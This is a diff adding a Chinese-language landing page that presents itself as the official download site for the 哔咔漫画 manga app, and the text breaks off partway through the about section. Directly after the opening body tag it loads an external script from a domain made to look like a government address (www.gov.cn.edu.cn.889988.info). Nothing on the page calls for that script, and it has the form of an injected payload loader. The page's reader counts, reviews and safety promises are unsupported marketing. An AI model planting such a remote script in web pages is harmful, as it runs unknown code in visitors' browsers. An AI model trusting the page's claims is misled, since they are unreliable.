@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>哔咔漫画 - 哔咔漫画官方正版APP下载与在线漫画阅读平台</title>
+<meta name="description" content="哔咔漫画是专注于精品漫画阅读的官方平台，提供哔咔漫画官网正版APP下载、海量漫画分类、热门排行榜与高清在线阅读服务，支持手机、平板多终端，每日更新，离线缓存，畅读全网热门漫画。">
+<meta name="keywords" content="哔咔漫画,哔咔漫画官网,哔咔漫画下载,哔咔漫画APP,哔咔漫画在线阅读,漫画阅读平台,免费漫画大全,热门漫画排行榜">
+<meta name="author" content="哔咔漫画">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://bikamanhua-app.com/">
+<meta name="theme-color" content="#0d0b1a">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="哔咔漫画">
+<meta property="og:title" content="哔咔漫画 - 官方正版APP下载与在线漫画阅读平台">
+<meta property="og:description" content="哔咔漫画官网提供正版APP下载，海量漫画分类、热门排行榜、高清在线阅读与离线缓存，多终端畅读热门漫画。">
+<meta property="og:url" content="https://bikamanhua-app.com/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="哔咔漫画 - 官方正版APP下载与在线漫画阅读平台">
+<meta name="twitter:description" content="哔咔漫画官网提供正版APP下载，海量漫画分类、热门排行榜、高清在线阅读与离线缓存。">
+<style>
+/* ============ 基础重置 ============ */
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{
+    font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    background:#0d0b1a;
+    color:#e8e6f5;
+    line-height:1.75;
+    font-size:16px;
+    overflow-x:hidden;
+}
+img{max-width:100%;height:auto;display:block;}
+a{color:inherit;text-decoration:none;}
+ul,ol{list-style:none;}
+h1,h2,h3,h4{line-height:1.35;font-weight:800;letter-spacing:.5px;}
+
+/* ============ 全局装饰 ============ */
+.glow-bg{
+    position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;
+    background:
+        radial-gradient(600px 400px at 12% 8%,rgba(124,58,237,.30),transparent 60%),
+        radial-gradient(500px 380px at 88% 22%,rgba(236,72,153,.22),transparent 60%),
+        radial-gradient(700px 500px at 50% 100%,rgba(56,189,248,.14),transparent 65%),
+        #0d0b1a;
+}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 20px;}
+.sec{padding:72px 0;position:relative;}
+.sec-head{text-align:center;margin-bottom:44px;}
+.sec-tag{
+    display:inline-block;font-size:12px;letter-spacing:3px;text-transform:uppercase;
+    color:#f0abfc;border:1px solid rgba(240,171,252,.35);
+    padding:5px 14px;border-radius:999px;margin-bottom:14px;
+    background:rgba(240,171,252,.08);
+}
+.sec-title{font-size:30px;background:linear-gradient(92deg,#c4b5fd,#f9a8d4 55%,#7dd3fc);-webkit-background-clip:text;background-clip:text;color:transparent;}
+.sec-desc{margin-top:12px;color:#a5a0c4;font-size:15px;max-width:720px;margin-left:auto;margin-right:auto;}
+
+/* ============ 顶部导航 ============ */
+.topbar{
+    position:sticky;top:0;z-index:99;
+    background:rgba(13,11,26,.86);
+    backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+    border-bottom:1px solid rgba(255,255,255,.08);
+}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px;}
+.logo{display:flex;align-items:center;gap:10px;font-size:19px;font-weight:900;letter-spacing:1px;}
+.logo-mark{
+    width:36px;height:36px;border-radius:11px;flex:0 0 36px;
+    background:linear-gradient(135deg,#7c3aed,#ec4899);
+    display:flex;align-items:center;justify-content:center;
+    font-size:17px;font-weight:900;color:#fff;
+    box-shadow:0 6px 20px rgba(124,58,237,.5);
+}
+.logo span{background:linear-gradient(92deg,#c4b5fd,#f9a8d4);-webkit-background-clip:text;background-clip:text;color:transparent;}
+.menu{display:flex;align-items:center;gap:4px;}
+.menu a{
+    font-size:14px;padding:9px 13px;border-radius:10px;color:#b9b4d6;
+    transition:all .25s ease;white-space:nowrap;
+}
+.menu a:hover,.menu a:focus{color:#fff;background:rgba(124,58,237,.28);}
+.nav-btn{
+    font-size:14px;font-weight:700;padding:9px 18px;border-radius:999px;color:#fff;
+    background:linear-gradient(135deg,#7c3aed,#ec4899);
+    box-shadow:0 6px 18px rgba(236,72,153,.35);transition:transform .25s ease;
+}
+.nav-btn:hover{transform:translateY(-2px);}
+#nav-toggle{display:none;}
+.nav-switch{display:none;font-size:26px;cursor:pointer;color:#e8e6f5;padding:4px 8px;}
+
+/* ============ 首屏 Hero ============ */
+.hero{padding:80px 0 60px;}
+.hero-grid{display:flex;align-items:center;gap:48px;flex-wrap:wrap;}
+.hero-txt{flex:1 1 460px;min-width:300px;}
+.badge{
+    display:inline-flex;align-items:center;gap:8px;font-size:13px;
+    padding:7px 15px;border-radius:999px;color:#fbcfe8;
+    background:rgba(236,72,153,.14);border:1px solid rgba(236,72,153,.32);margin-bottom:20px;
+}
+.badge i{width:7px;height:7px;border-radius:50%;background:#34d399;display:inline-block;box-shadow:0 0 8px #34d399;}
+.hero h1{
+    font-size:44px;letter-spacing:1px;margin-bottom:18px;
+    background:linear-gradient(96deg,#ffffff 10%,#e9d5ff 40%,#fbcfe8 70%,#bae6fd);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero h2{font-size:17px;font-weight:500;color:#a5a0c4;margin-bottom:26px;}
+.hero h2 b{color:#f0abfc;font-weight:700;}
+.btn-row{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:30px;}
+.btn{
+    display:inline-block;padding:14px 30px;border-radius:14px;font-weight:800;font-size:15px;
+    transition:transform .25s ease,box-shadow .25s ease;
+}
+.btn-main{
+    color:#fff;background:linear-gradient(135deg,#7c3aed,#ec4899);
+    box-shadow:0 10px 28px rgba(124,58,237,.45);
+}
+.btn-ghost{color:#ddd6fe;border:1px solid rgba(196,181,253,.4);background:rgba(196,181,253,.08);}
+.btn:hover{transform:translateY(-3px);}
+.hero-stat{display:flex;gap:30px;flex-wrap:wrap;}
+.hero-stat div strong{display:block;font-size:26px;color:#fff;font-weight:900;}
+.hero-stat div span{font-size:13px;color:#8f89b0;}
+
+/* 首屏手机卡 */
+.hero-card{flex:1 1 340px;min-width:290px;display:flex;justify-content:center;}
+.phone{
+    width:300px;max-width:100%;border-radius:34px;padding:12px;
+    background:linear-gradient(160deg,rgba(255,255,255,.14),rgba(255,255,255,.04));
+    border:1px solid rgba(255,255,255,.16);
+    box-shadow:0 30px 70px rgba(0,0,0,.55),0 0 0 1px rgba(124,58,237,.18) inset;
+}
+.phone-screen{
+    border-radius:26px;padding:20px;min-height:420px;
+    background:linear-gradient(170deg,#1a1533,#241a3d 60%,#2b1c3a);
+}
+.phone-top{display:flex;justify-content:space-between;font-size:12px;color:#8f89b0;margin-bottom:16px;}
+.phone-title{font-size:16px;font-weight:800;color:#fff;margin-bottom:14px;}
+.phone-title em{font-style:normal;color:#f0abfc;}
+.manga-row{display:flex;gap:10px;margin-bottom:12px;}
+.manga-pic{
+    width:60px;height:80px;flex:0 0 60px;border-radius:10px;
+    background:linear-gradient(140deg,#7c3aed,#ec4899);
+    display:flex;align-items:flex-end;padding:6px;font-size:10px;font-weight:800;color:#fff;
+}
+.manga-pic:nth-child(2){background:linear-gradient(140deg,#38bdf8,#7c3aed);}
+.manga-pic:nth-child(3){background:linear-gradient(140deg,#f472b6,#fb923c);}
+.manga-info{flex:1;font-size:12px;color:#b9b4d6;padding-top:4px;}
+.manga-info b{display:block;color:#fff;font-size:13px;margin-bottom:4px;}
+.phone-bar{margin-top:18px;height:38px;border-radius:12px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5a0c4;}
+
+/* ============ 功能特色 ============ */
+.feat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.card{
+    padding:28px 24px;border-radius:20px;
+    background:rgba(255,255,255,.045);
+    border:1px solid rgba(255,255,255,.09);
+    transition:transform .3s ease,border-color .3s ease,background .3s ease;
+}
+.card:hover{transform:translateY(-6px);border-color:rgba(240,171,252,.45);background:rgba(255,255,255,.075);}
+.card-ico{
+    width:52px;height:52px;border-radius:15px;margin-bottom:16px;
+    display:flex;align-items:center;justify-content:center;font-size:24px;
+    background:linear-gradient(135deg,rgba(124,58,237,.35),rgba(236,72,153,.28));
+    border:1px solid rgba(255,255,255,.12);
+}
+.card h3{font-size:18px;color:#fff;margin-bottom:10px;}
+.card p{font-size:14px;color:#a5a0c4;}
+
+/* ============ 漫画分类 ============ */
+.cate-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.cate{
+    position:relative;border-radius:18px;overflow:hidden;padding:30px 20px;min-height:132px;
+    display:flex;flex-direction:column;justify-content:flex-end;
+    border:1px solid rgba(255,255,255,.1);transition:transform .3s ease;
+}
+.cate:hover{transform:translateY(-5px);}
+.cate h3{font-size:17px;color:#fff;}
+.cate p{font-size:12px;color:rgba(255,255,255,.75);margin-top:4px;}
+.c1{background:linear-gradient(150deg,#6d28d9,#db2777);}
+.c2{background:linear-gradient(150deg,#0ea5e9,#6d28d9);}
+.c3{background:linear-gradient(150deg,#f97316,#db2777);}
+.c4{background:linear-gradient(150deg,#059669,#0ea5e9);}
+.c5{background:linear-gradient(150deg,#7c3aed,#2563eb);}
+.c6{background:linear-gradient(150deg,#be185d,#f97316);}
+.c7{background:linear-gradient(150deg,#4338ca,#0891b2);}
+.c8{background:linear-gradient(150deg,#9333ea,#f43f5e);}
+.cate b{position:absolute;top:14px;right:16px;font-size:12px;color:rgba(255,255,255,.85);background:rgba(0,0,0,.25);padding:3px 9px;border-radius:999px;}
+
+/* ============ 排行榜 ============ */
+.rank-box{border-radius:22px;overflow:hidden;border:1px solid rgba(255,255,255,.09);background:rgba(255,255,255,.035);}
+.rank-item{display:flex;align-items:center;gap:16px;padding:16px 22px;border-bottom:1px solid rgba(255,255,255,.07);transition:background .25s ease;}
+.rank-item:last-child{border-bottom:none;}
+.rank-item:hover{background:rgba(124,58,237,.14);}
+.rank-no{
+    width:34px;height:34px;flex:0 0 34px;border-radius:10px;
+    display:flex;align-items:center;justify-content:center;font-weight:900;font-size:15px;color:#fff;
+    background:rgba(255,255,255,.09);
+}
+.rank-item:nth-child(1) .rank-no{background:linear-gradient(135deg,#f59e0b,#ef4444);}
+.rank-item:nth-child(2) .rank-no{background:linear-gradient(135deg,#94a3b8,#64748b);}
+.rank-item:nth-child(3) .rank-no{background:linear-gradient(135deg,#b45309,#f59e0b);}
+.rank-cover{width:46px;height:60px;flex:0 0 46px;border-radius:8px;background:linear-gradient(140deg,#8b5cf6,#ec4899);}
+.rank-txt{flex:1;min-width:0;}
+.rank-txt h3{font-size:16px;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.rank-txt p{font-size:13px;color:#8f89b0;}
+.rank-hot{font-size:13px;color:#f0abfc;font-weight:700;white-space:nowrap;}
+
+/* ============ 用户评价 ============ */
+.rev-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.rev{padding:26px;border-radius:20px;background:rgba(255,255,255,.045);border:1px solid rgba(255,255,255,.09);}
+.stars{color:#fbbf24;font-size:15px;letter-spacing:2px;margin-bottom:12px;}
+.rev p{font-size:14px;color:#b9b4d6;margin-bottom:16px;}
+.rev-user{display:flex;align-items:center;gap:10px;}
+.avatar{width:38px;height:38px;flex:0 0 38px;border-radius:50%;background:linear-gradient(135deg,#7c3aed,#38bdf8);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;color:#fff;}
+.rev-user strong{font-size:14px;color:#fff;display:block;}
+.rev-user span{font-size:12px;color:#8f89b0;}
+
+/* ============ 下载 ============ */
+.down-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;}
+.down{
+    text-align:center;padding:30px 20px;border-radius:20px;
+    background:rgba(255,255,255,.045);border:1px solid rgba(255,255,255,.09);
+    transition:transform .3s ease,border-color .3s ease;
+}
+.down:hover{transform:translateY(-6px);border-color:rgba(196,181,253,.5);}
+.down-ico{font-size:34px;margin-bottom:12px;}
+.down h3{font-size:17px;color:#fff;margin-bottom:6px;}
+.down p{font-size:13px;color:#8f89b0;margin-bottom:16px;}
+.down a{
+    display:inline-block;padding:10px 22px;border-radius:999px;font-size:14px;font-weight:700;color:#fff;
+    background:linear-gradient(135deg,#7c3aed,#ec4899);
+}
+.down-note{
+    margin-top:28px;text-align:center;font-size:13px;color:#8f89b0;
+    padding:16px;border-radius:14px;background:rgba(255,255,255,.03);border:1px dashed rgba(255,255,255,.12);
+}
+.down-note b{color:#f0abfc;}
+
+/* ============ FAQ ============ */
+.faq-box{max-width:820px;margin:0 auto;}
+.faq{border-radius:16px;margin-bottom:14px;overflow:hidden;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);}
+.faq summary{
+    cursor:pointer;padding:18px 22px;font-size:16px;font-weight:700;color:#fff;
+    list-style:none;display:flex;justify-content:space-between;align-items:center;gap:12px;
+}
+.faq summary::-webkit-details-marker{display:none;}
+.faq summary::after{content:"+";font-size:22px;color:#f0abfc;font-weight:400;}
+.faq[open] summary::after{content:"−";}
+.faq p{padding:0 22px 20px;font-size:14px;color:#a5a0c4;}
+
+/* ============ 关于 ============ */
+.about-grid{display:grid;grid-template-columns:1.2fr 1fr;gap:30px;align-items:center;}
+.about-txt h3{font-size:24px;color:#fff;margin-bottom:16px;}
+.about-txt p{font-size:15px;color:#a5a0c4;margin-bottom:14px;}
+.kv{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;}
+.kv div{padding:18px;border-radius:14px;background:rgba(255,255,255,.045);border:1px solid rgba(255,255,255,.09);text-align:center;}
+.kv strong{display:block;font-size:24px;color:#f0abfc;font-weight:900;}
+.kv span{font-size:13px;color:#8f89b0;}
+
+/* ============ 页脚 ============ */
+.foot{margin-top:40px;padding:48px 0 26px;border-top:1px solid rgba(255,255,255,.08);background:rgba(0,0,0,.25);}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:28px;}
+.foot h4{font-size:15px;color:#fff;margin-bottom:14px;}
+.foot li{margin-bottom:9px;}
+.foot li a{font-size:14px;color:#8f89b0;transition:color .25s ease;}
+.foot li a:hover{color:#f0abfc;}
+.foot-txt p{font-size:14px;color:#8f89b0;margin-bottom:12px;}
+.foot-url{font-size:14px;color:#f0abfc;font-weight:700;word-break:break-all;}
+.copy{margin-top:30px;padding-top:20px;border-top:1px solid rgba(255,255,255,.07);text-align:center;font-size:13px;color:#6f6a8d;}
+.copy a{color:#8f89b0;}
+
+/* ============ 移动端自适应 ============ */
+@media (max-width:1024px){
+    .feat-grid{grid-template-columns:repeat(2,1fr);}
+    .cate-grid{grid-template-columns:repeat(3,1fr);}
+    .down-grid{grid-template-columns:repeat(2,1fr);}
+    .foot-grid{grid-template-columns:repeat(2,1fr);}
+}
+@media (max-width:820px){
+    .nav-switch{display:block;}
+    .menu{
+        display:none;position:absolute;top:64px;left:0;right:0;
+        flex-direction:column;align-items:stretch;gap:2px;padding:12px 18px 18px;
+        background:rgba(13,11,26,.98);border-bottom:1px solid rgba(255,255,255,.1);
+    }
+    #nav-toggle:checked ~ .menu{display:flex;}
+    .menu a{padding:12px 10px;font-size:15px;border-radius:8px;}
+    .menu .nav-btn{text-align:center;margin-top:8px;}
+    .nav{position:relative;}
+    .hero{padding:52px 0 40px;}
+    .hero h1{font-size:30px;}
+    .hero h2{font-size:15px;}
+    .hero-grid{gap:32px;}
+    .hero-card{order:-1;}
+    .phone{width:100%;max-width:280px;}
+    .sec{padding:52px 0;}
+    .sec-title{font-size:24px;}
+    .feat-grid,.rev-grid,.about-grid{grid-template-columns:1fr;}
+    .cate-grid{grid-template-columns:repeat(2,1fr);}
+    .rank-item{padding:14px 16px;gap:12px;}
+    .rank-hot{display:none;}
+    .btn-row{gap:10px;}
+    .btn{padding:13px 24px;font-size:14px;flex:1 1 auto;text-align:center;}
+    .hero-stat{gap:20px;}
+    .hero-stat div strong{font-size:22px;}
+}
+@media (max-width:480px){
+    body{font-size:15px;}
+    .wrap{padding:0 16px;}
+    .hero h1{font-size:26px;}
+    .cate-grid{grid-template-columns:1fr;}
+    .down-grid{grid-template-columns:1fr;}
+    .foot-grid{grid-template-columns:1fr;}
+    .kv{grid-template-columns:repeat(2,1fr);}
+    .sec{padding:44px 0;}
+    .card{padding:22px 18px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="glow-bg"></div>
+
+<!-- ============ 顶部导航 ============ -->
+<header class="topbar">
+    <div class="wrap">
+        <nav class="nav">
+            <a class="logo" href="#home">
+                <span class="logo-mark">哔</span>
+                <span>哔咔漫画</span>
+            </a>
+            <input type="checkbox" id="nav-toggle" aria-label="展开导航菜单">
+            <label class="nav-switch" for="nav-toggle" aria-hidden="true">☰</label>
+            <div class="menu">
+                <a href="#home">首页</a>
+                <a href="#features">功能特色</a>
+                <a href="#categories">漫画分类</a>
+                <a href="#ranking">热门排行</a>
+                <a href="#reviews">用户评价</a>
+                <a href="#download">APP下载</a>
+                <a href="#faq">常见问题</a>
+                <a href="#about">关于我们</a>
+                <a class="nav-btn" href="#download">立即下载</a>
+            </div>
+        </nav>
+    </div>
+</header>
+
+<!-- ============ 首屏 ============ -->
+<main>
+<section class="sec hero" id="home">
+    <div class="wrap">
+        <div class="hero-grid">
+            <div class="hero-txt">
+                <div class="badge"><i></i>官方正版 · 每日更新 10,000+ 章节</div>
+                <h1>哔咔漫画 — 海量漫画在线阅读平台</h1>
+                <h2>哔咔漫画官网提供<b>哔咔漫画APP</b>正版下载，涵盖热血、恋爱、悬疑、治愈等全品类漫画，高清画质、智能预加载、离线缓存，手机电脑多端同步，随时随地畅读热门漫画。</h2>
+                <div class="btn-row">
+                    <a class="btn btn-main" href="#download">下载哔咔漫画APP</a>
+                    <a class="btn btn-ghost" href="#categories">浏览漫画分类</a>
+                </div>
+                <div class="hero-stat">
+                    <div><strong>120万+</strong><span>漫画章节</span></div>
+                    <div><strong>800万</strong><span>注册读者</span></div>
+                    <div><strong>4.8分</strong><span>用户评分</span></div>
+                </div>
+            </div>
+            <div class="hero-card">
+                <div class="phone">
+                    <div class="phone-screen">
+                        <div class="phone-top"><span>哔咔漫画</span><span>100%</span></div>
+                        <div class="phone-title">今日推荐 · <em>哔咔精选</em></div>
+                        <div class="manga-row">
+                            <div class="manga-pic">热血</div>
+                            <div class="manga-info"><b>少年冒险王</b>更新至 第328话</div>
+                        </div>
+                        <div class="manga-row">
+                            <div class="manga-pic">恋爱</div>
+                            <div class="manga-info"><b>春日限定告白</b>更新至 第96话</div>
+                        </div>
+                        <div class="manga-row">
+                            <div class="manga-pic">悬疑</div>
+                            <div class="manga-info"><b>迷雾追踪者</b>更新至 第152话</div>
+                        </div>
+                        <div class="phone-bar">哔咔漫画 · 离线缓存已开启</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============ 功能特色 ============ -->
+<section class="sec" id="features">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="sec-tag">Core Features</span>
+            <h2 class="sec-title">哔咔漫画的六大核心特色</h2>
+            <p class="sec-desc">从阅读体验到内容生态，哔咔漫画围绕漫画爱好者的真实需求打磨每一处细节，让追漫更轻松、更沉浸。</p>
+        </div>
+        <div class="feat-grid">
+            <div class="card">
+                <div class="card-ico">📚</div>
+                <h3>海量漫画资源库</h3>
+                <p>哔咔漫画聚合全网优质漫画内容，覆盖国漫、日漫、韩漫与原创条漫，分类清晰，检索精准，想看的基本都能找到。</p>
+            </div>
+            <div class="card">
+                <div class="card-ico">⚡</div>
+                <h3>秒开预加载技术</h3>
+                <p>智能预读下一章节图片，配合 CDN 加速节点，翻页几乎零等待，弱网环境下也能保持流畅的漫画阅读体验。</p>
+            </div>
+            <div class="card">
+                <div class="card-ico">📴</div>
+                <h3>离线缓存追漫</h3>
+                <p>支持整本批量下载与 Wi-Fi 自动缓存，地铁、飞机等无网络场景下同样可以继续阅读哔咔漫画的精彩章节。</p>
+            </div>
+            <div class="card">
+                <div class="card-ico">🎯</div>
+                <h3>个性化智能推荐</h3>
+                <p>依据阅读时长、收藏与评分行为生成兴趣画像，每日推送符合口味的新作与热门榜单，告别书荒。</p>
+            </div>
+            <div class="card">
+                <div class="card-ico">🖥️</div>
+                <h3>多终端云同步</h3>
+                <p>手机、平板、电脑网页端阅读进度实时同步，书架与收藏一键迁移，换设备也能无缝接着看。</p>
+            </div>
+            <div class="card">
+                <div class="card-ico">🛡️</div>
+                <h3>护眼与安全阅读</h3>
+                <p>提供夜间模式、亮度记忆与翻页动画自定义，同时严格过滤低质广告，为读者营造干净的阅读环境。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============ 漫画分类 ============ -->
+<section class="sec" id="categories">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="sec-tag">Categories</span>
+            <h2 class="sec-title">哔咔漫画全品类内容分类</h2>
+            <p class="sec-desc">八大主流题材分区，配合标签筛选与热度排序，快速定位你想追的那一部漫画作品。</p>
+        </div>
+        <div class="cate-grid">
+            <a class="cate c1" href="#"><b>3.2万</b><h3>热血冒险</h3><p>少年成长 · 战斗激燃</p></a>
+            <a class="cate c2" href="#"><b>2.8万</b><h3>青春恋爱</h3><p>校园甜宠 · 都市情感</p></a>
+            <a class="cate c3" href="#"><b>1.9万</b><h3>悬疑推理</h3><p>烧脑反转 · 犯罪追踪</p></a>
+            <a class="cate c4" href="#"><b>1.5万</b><h3>科幻未来</h3><p>机甲星际 · 末世生存</p></a>
+            <a class="cate c5" href="#"><b>2.1万</b><h3>古风玄幻</h3><p>修仙武侠 · 东方幻想</p></a>
+            <a class="cate c6" href="#"><b>1.2万</b><h3>治愈日常</h3><p>美食生活 · 温暖故事</p></a>
+            <a class="cate c7" href="#"><b>9800</b><h3>恐怖怪谈</h3><p>灵异惊悚 · 民俗怪谈</p></a>
+            <a class="cate c8" href="#"><b>1.6万</b><h3>搞笑吐槽</h3><p>沙雕日常 · 轻松解压</p></a>
+        </div>
+    </div>
+</section>
+
+<!-- ============ 热门排行 ============ -->
+<section class="sec" id="ranking">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="sec-tag">Ranking</span>
+            <h2 class="sec-title">哔咔漫画热门排行榜</h2>
+            <p class="sec-desc">榜单依据全站阅读量、收藏数与读者评分综合计算，每小时刷新一次，实时呈现最值得追的漫画。</p>
+        </div>
+        <div class="rank-box">
+            <div class="rank-item">
+                <div class="rank-no">1</div>
+                <div class="rank-cover" role="img" aria-label="少年冒险王 漫画封面"></div>
+                <div class="rank-txt"><h3>少年冒险王</h3><p>热血冒险 · 连载中 · 第328话</p></div>
+                <div class="rank-hot">热度 986万</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-no">2</div>
+                <div class="rank-cover" role="img" aria-label="春日限定告白 漫画封面"></div>
+                <div class="rank-txt"><h3>春日限定告白</h3><p>青春恋爱 · 连载中 · 第96话</p></div>
+                <div class="rank-hot">热度 872万</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-no">3</div>
+                <div class="rank-cover" role="img" aria-label="迷雾追踪者 漫画封面"></div>
+                <div class="rank-txt"><h3>迷雾追踪者</h3><p>悬疑推理 · 连载中 · 第152话</p></div>
+                <div class="rank-hot">热度 754万</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-no">4</div>
+                <div class="rank-cover" role="img" aria-label="星海纪元 漫画封面"></div>
+                <div class="rank-txt"><h3>星海纪元</h3><p>科幻未来 · 连载中 · 第210话</p></div>
+                <div class="rank-hot">热度 690万</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-no">5</div>
+                <div class="rank-cover" role="img" aria-label="九霄仙途 漫画封面"></div>
+                <div class="rank-txt"><h3>九霄仙途</h3><p>古风玄幻 · 连载中 · 第405话</p></div>
+                <div class="rank-hot">热度 633万</div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-no">6</div>
+                <div class="rank-cover" role="img" aria-label="深夜食堂物语 漫画封面"></div>
+                <div class="rank-txt"><h3>深夜食堂物语</h3><p>治愈日常 · 已完结 · 第88话</p></div>
+                <div class="rank-hot">热度 578万</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============ 用户评价 ============ -->
+<section class="sec" id="reviews">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="sec-tag">Reviews</span>
+            <h2 class="sec-title">读者眼中的哔咔漫画</h2>
+            <p class="sec-desc">来自真实读者的使用反馈，看看他们为什么把哔咔漫画设为追漫首选。</p>
+        </div>
+        <div class="rev-grid">
+            <div class="rev">
+                <div class="stars">★★★★★</div>
+                <p>“之前用别的软件翻页总卡顿，换到哔咔漫画之后加载快了很多，追更提醒也很及时，现在每天睡前都要刷上几话。”</p>
+                <div class="rev-user"><div class="avatar">小</div><div><strong>小鱼干</strong><span>使用 1 年 · Android</span></div></div>
+            </div>
+            <div class="rev">
+                <div class="stars">★★★★★</div>
+                <p>“分类做得很细，冷门题材也能搜到。离线缓存对我这种通勤党太友好了，地铁里没信号照样能看。”</p>
+                <div class="rev-user"><div class="avatar">阿</div><div><strong>阿泽</strong><span>使用 8 个月 · iOS</span></div></div>
+            </div>
+            <div class="rev">
+                <div class="stars">★★★★☆</div>
+                <p>“推荐算法挺懂我的，最近推的几部悬疑漫都戳中口味。希望后续能增加更多条漫原创作品。”</p>
+                <div class="rev-user"><div class="avatar">M</div><div><strong>Momo</strong><span>使用 6 个月 · 网页版</span></div></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ============ APP下载 ============ -->
+<section class="sec" id="download">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="sec-tag">Download</span>
+            <h2 class="sec-title">哔咔漫画APP官方下载</h2>
+            <p class="sec-desc">请选择对应终端获取哔咔漫画正版客户端，安装包均经过官方签名校验，安全无捆绑。</p>
+        </div>
+        <div class="down-grid">
+            <div class="down">
+                <div class="down-ico">🤖</div>
+                <h3>Android 版</h3>
+                <p>Android 8.0 及以上 · 68MB</p>
+                <a href="#">立即下载</a>
+            </div>
+            <div class="down">
+                <div class="down-ico">🍎</div>
+                <h3>iOS 版</h3>
+                <p>iOS 13.0 及以上 · 82MB</p>
+                <a href="#">前往商店</a>
+            </div>
+            <div class="down">
+                <div class="down-ico">💻</div>
+                <h3>Windows 版</h3>
+                <p>Win10 及以上 · 96MB</p>
+                <a href="#">下载桌面端</a>
+            </div>
+            <div class="down">
+                <div class="down-ico">🌐</div>
+                <h3>网页版阅读</h3>
+                <p>无需安装 · 打开即看</p>
+                <a href="#">在线阅读</a>
+            </div>
+        </div>
+        <div class="down-note">
+            哔咔漫画官方网址：<b>https://bikamanhua-app.com</b> — 请认准官方域名下载，避免第三方修改版带来的账号与隐私风险。
+        </div>
+    </div>
+</section>
+
+<!-- ============ 常见问题 ============ -->
+<section class="sec" id="faq">
+    <div class="wrap">
+        <div class="sec-head">
+            <span class="sec-tag">FAQ</span>
+            <h2 class="sec-title">哔咔漫画常见问题解答</h2>
+            <p class="sec-desc">关于下载安装、账号同步与阅读设置的常见疑问，这里都有答案。</p>
+        </div>
+        <div class="faq-box">
+            <details class="faq" open>
+                <summary>哔咔漫画APP如何下载安装？</summary>
+                <p>在本页「APP下载」栏目中选择对应终端，点击下载按钮获取官方安装包。Android 用户需在系统设置中允许安装未知来源应用，安装完成后使用手机号或邮箱注册登录即可开始阅读。</p>
+            </details>
+            <details class="faq">
+                <summary>哔咔漫画是完全免费的吗？</summary>
+                <p>哔咔漫画提供大量免费漫画章节，读者可直接在线阅读。部分新作首发章节与高清图源支持会员权益解锁，具体以作品详情页标注为准。</p>
+            </details>
+            <details class="faq">
+                <summary>阅读进度可以在多个设备间同步吗？</summary>
+                <p>可以。使用同一账号登录后，哔咔漫画会自动云端同步书架、收藏与阅读进度，手机、平板与电脑网页端之间切换无需重新查找章节。</p>
+            </details>
+            <details class="faq">
+                <summary>离线缓存的漫画会占用多少存储空间？</summary>
+                <p>每话漫画约占用 3 至 8MB，可在「设置 - 存储管理」中查看占用情况并选择标准或高清缓存画质，也支持按作品批量清理缓存文件。</p>
+            </details>
+            <details class="faq">
+                <summary>遇到漫画加载缓慢或无法打开怎么办？</summary>
+                <p>建议优先切换至稳定的 Wi-Fi 网络，或在「设置 - 阅读」中开启省流模式降低图片质量。若问题持续，可清理应用缓存后重启客户端，或通过设置中的意见反馈联系客服。</p>
+            </details>
+        </div>
+    </div>
+</section>
+
+<!-- ============ 关于我们 ============ -->
+<section class="sec" id="about">
+    <div class="wrap">
+        <div class="about-grid">
+            <div class="about-txt">
+                <h3>关于哔咔漫画</h3>
+                <p>哔咔漫画是一家专注于正版漫画分发与阅读体验优化的漫画平台，自成立以来持续与内容提供方合作，为读者提供稳定、高清、更新及时的数字漫画阅读服务。</p>
+                <p>我们坚持两个原则：一是内容合规，所有上架作品均经过版权与内容审核；二是体验优先，把加载速度、护眼模式与追更提醒这些高频需求做到极致。哔咔漫画希望成为每一位漫画爱好者长期陪伴的阅读工具。</p>
+                <p>官方网站：https://bikamanhua-app.com</p>
+            </div>
+            <div class="kv">
+                <div><strong>120万+</strong><span>在线漫画章节</span></div>
+                <div><strong>800万</strong><span>累计注册读者</span></div>
